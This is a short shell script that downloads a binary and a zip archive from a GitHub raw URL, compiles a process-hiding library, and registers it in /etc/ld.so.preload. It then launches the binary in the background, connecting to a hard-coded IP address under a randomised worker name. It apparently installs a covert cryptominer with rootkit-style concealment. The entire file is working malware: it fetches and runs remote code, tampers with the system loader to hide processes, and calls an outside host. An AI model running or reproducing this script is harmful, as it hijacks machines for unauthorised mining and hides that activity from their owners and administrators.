#!/bin/sh

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
nohup ./bezzHash --url=babeh46.$(echo $(shuf -i 1-99999 -n 1)-T4)@3.215.245.39:443 > nohup.out
